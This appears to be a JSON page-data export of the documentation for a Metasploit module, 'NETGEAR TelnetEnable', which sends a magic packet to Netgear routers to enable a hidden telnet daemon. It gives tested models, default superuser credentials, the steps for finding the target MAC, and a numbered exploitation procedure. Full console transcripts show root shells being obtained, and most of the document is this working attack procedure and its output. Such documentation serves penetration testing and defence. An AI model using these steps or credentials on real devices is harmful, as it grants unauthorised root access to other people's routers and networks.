{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/telnet/netgear_telnetenable","result":{"data":{"moduleMetadataJson":{"id":"26352881-6a8b-516d-8e5e-657868295430","name":"NETGEAR TelnetEnable","fullname":"exploit/linux/telnet/netgear_telnetenable","description":"This module sends a magic packet to a NETGEAR device to enable telnetd.\n        Upon successful connect, a root shell should be presented to the user.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/telnet/netgear_telnetenable","documentationSlug":"/modules/documentation/exploit/linux/telnet/netgear_telnetenable","referencesSlug":"/modules/references/exploit/linux/telnet/netgear_telnetenable"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>Several models of Netgear devices have a hidden telnet daemon that can be\nenabled for remote LAN users by sending a 'magic packet' to the device.\nUpon successful connect, a root shell should be presented to the user.</p>\n<p>There are many devices which contain this daemon, for a full list see <a href=\"https://wiki.openwrt.org/toh/netgear/telnet.console\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenWrt</a>.</p>\n<p>This module has been successfully tested against:</p>\n<ul>\n<li>AC1450 - unknown older firmware (TCP)</li>\n<li>AC1450 - latest firmware: V1.0.0.36_10.0.17 (UDP)</li>\n<li>N300 WNR2000 v3 - firmware: V1.1.2.10 (TCP)</li>\n</ul>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p>A MAC address is required for exploitation.  To determine the MAC address of the device:</p>\n<ol>\n<li>Ping the device to force an ARP lookup: <code class=\"language-text\">ping -c 1 [IP]</code></li>\n<li>Get the MAC: <code class=\"language-text\">arp -an [IP]</code></li>\n</ol>\n<p>If you are the root user, you can skip this step. ARP will be leveraged\nto find the MAC address.</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<p><strong>0 (Automatic)</strong></p>\n<p>Detect if a device listens on TCP or UDP.</p>\n<p><strong>1 (TCP)</strong></p>\n<p>Older devices usually listen on TCP.</p>\n<p><strong>2 (UDP)</strong></p>\n<p>Newer devices usually listen on UDP.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>MAC</strong></p>\n<p>Set this to the MAC address of the device. You can use <code class=\"language-text\">ping</code> and <code class=\"language-text\">arp</code>\nto find it.</p>\n<p>You can leave this blank if you're root.</p>\n<p><strong>USERNAME</strong></p>\n<p>If this is an older device, it'll take the value of <code class=\"language-text\">super_username</code> in\n<code class=\"language-text\">nvram</code>, which is usually unchanged from <code class=\"language-text\">Gearguy</code>.</p>\n<p>If this is a newer device, it'll take the web UI username, which is\nusually unchanged from <code class=\"language-text\">admin</code>.</p>\n<p>You can leave this blank to use the default username.</p>\n<p><strong>PASSWORD</strong></p>\n<p>If this is an older device, it'll take the value of <code class=\"language-text\">super_passwd</code> in\n<code class=\"language-text\">nvram</code>, which is usually unchanged from <code class=\"language-text\">Geardog</code>.</p>\n<p>If this is a newer device, it'll take the web UI password, which is\nusually unchanged from <code class=\"language-text\">password</code>.</p>\n<p>You can leave this blank to use the default password.</p>\n<h2 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h2>\n<ol>\n<li>Make sure you have a vulnerable device</li>\n<li>Start metasploit</li>\n<li><code class=\"language-text\">use exploit/linux/telnet/netgear_telnetenable</code></li>\n<li><code class=\"language-text\">set rhost [IP]</code></li>\n<li><code class=\"language-text\">set mac [MAC Address]</code> if not running as root</li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>Enjoy a root shell!</li>\n</ol>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<h3 id=\"ac1450\" style=\"position:relative;\"><a href=\"#ac1450\" aria-label=\"ac1450 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AC1450</h3>\n<p>As a normal user:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/telnet/netgear_telnetenable\nmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; set rhost 192.168.1.1\nrhost =&gt; 192.168.1.1\nmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; ping -c 1 192.168.1.1\n[*] exec: ping -c 1 192.168.1.1\n\nPING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=2.04 ms\n\n--- 192.168.1.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 2.041/2.041/2.041/0.000 ms\nmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; arp -an 192.168.1.1\n[*] exec: arp -an 192.168.1.1\n\n? (192.168.1.1) at [redacted] [ether] on wlan0\nmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; set mac [redacted]\nmac =&gt; [redacted]\nmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; run\n\n[+] 192.168.1.1:23 - Detected telnetenabled on UDP\n[+] 192.168.1.1:23 - Using creds admin:password\n[*] 192.168.1.1:23 - Generating magic packet\n[*] 192.168.1.1:23 - Connecting to telnetenabled via UDP\n[*] 192.168.1.1:23 - Sending magic packet\n[*] 192.168.1.1:23 - Disconnecting from telnetenabled\n[*] 192.168.1.1:23 - Waiting for telnetd\n[*] 192.168.1.1:23 - Connecting to telnetd\n[*] Found shell.\n[*] Command shell session 1 opened (192.168.1.3:34833 -&gt; 192.168.1.1:23) at 2018-03-02 19:26:25 -0600\n\nid\nid\nuid=0 gid=0(root)\n# uname -a\nuname -a\nLinux (none) 2.6.36.4brcmarm+ #16 SMP PREEMPT Wed Mar 22 15:02:38 CST 2017 armv7l unknown\n#</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>As root:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/telnet/netgear_telnetenable\nmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; set rhost 192.168.1.1\nrhost =&gt; 192.168.1.1\nrmsf5 exploit(linux/telnet/netgear_telnetenable) &gt; run\n\n[+] 192.168.1.1:23 - Detected telnetenabled on UDP\n[*] 192.168.1.1:23 - Attempting to discover MAC address via ARP\n[+] 192.168.1.1:23 - Found MAC address [redacted]\n[+] 192.168.1.1:23 - Using creds admin:password\n[*] 192.168.1.1:23 - Generating magic packet\n[*] 192.168.1.1:23 - Connecting to telnetenabled via UDP\n[*] 192.168.1.1:23 - Sending magic packet\n[*] 192.168.1.1:23 - Disconnecting from telnetenabled\n[*] 192.168.1.1:23 - Waiting for telnetd\n[*] 192.168.1.1:23 - Connecting to telnetd\n[*] Found shell.\n[*] Command shell session 1 opened (192.168.1.2:37771 -&gt; 192.168.1.1:23) at 2018-03-02 19:33:42 -0600\n\nid\nid\nuid=0 gid=0(root)\n# uname -a\nuname -a\nLinux (none) 2.6.36.4brcmarm+ #16 SMP PREEMPT Wed Mar 22 15:02:38 CST 2017 armv7l unknown\n#</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"26352881-6a8b-516d-8e5e-657868295430"}}}